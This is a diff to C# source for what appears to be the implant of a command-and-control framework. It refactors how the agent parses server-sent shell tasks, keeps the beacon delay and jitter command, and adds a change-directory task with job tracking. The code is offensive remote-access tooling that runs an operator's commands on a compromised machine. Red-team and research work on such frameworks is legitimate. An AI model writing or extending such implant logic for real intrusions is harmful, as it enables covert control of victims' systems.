@@ -360,21 +360,19 @@ AESc = AES encrypted using the client's session key
                         Environment.Exit(0);
                         return new byte[0];
                     case 40:
-                        string[] parts = packet.data.Split(' ');
                         string output;
-                        if (parts[0] == "Set-Delay")
+                        // Set-Delay piggybacks on TASK_SHELL for back-compat with the legacy server
+                        // tasking that didn't have a dedicated opcode for it.
+                        string[] parts = packet.data.Split(' ');
+                        if (parts.Length >= 3 && parts[0] == "Set-Delay")
                         {
                             sessionInfo.SetDefaultDelay(UInt32.Parse(parts[1]));
                             sessionInfo.SetDefaultJitter(UInt32.Parse(parts[2]));
                             output = "Delay set to " + parts[1] + " Jitter set to " + parts[2];
                         }
-                        else if (1 == parts.Length)
-                        {
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
-                        }
                         else
                         {
-                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), string.Join(" ", parts.Skip(1).Take(parts.Length - 1).ToArray()));
+                            output = Agent.InvokeShellCommand(packet.data);
                         }
                         byte[] packetBytes = EncodePacket(packet.type, output, packet.taskId);
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
@@ -387,6 +385,18 @@ AESc = AES encrypted using the client's session key
                         return Task42(packet);
                     case 43:
                         return Task43(packet);
+                    case 44:
+                        try
+                        {
+                            string newCwd = Agent.ChangeDirectory(packet.data);
+                            jobTracking.jobs[taskId.ToString()].Status = "completed";
+                            return EncodePacket(44, newCwd, packet.taskId);
+                        }
+                        catch (Exception chdirError)
+                        {
+                            jobTracking.jobs[taskId.ToString()].Status = "error";
+                            return EncodePacket(0, "[!] chdir failed: " + chdirError.Message, packet.taskId);
+                        }
                     case 50:
                         jobTracking.jobs[taskId.ToString()].Status = "completed";
                         return GenerateRunningJobsTable(packet);
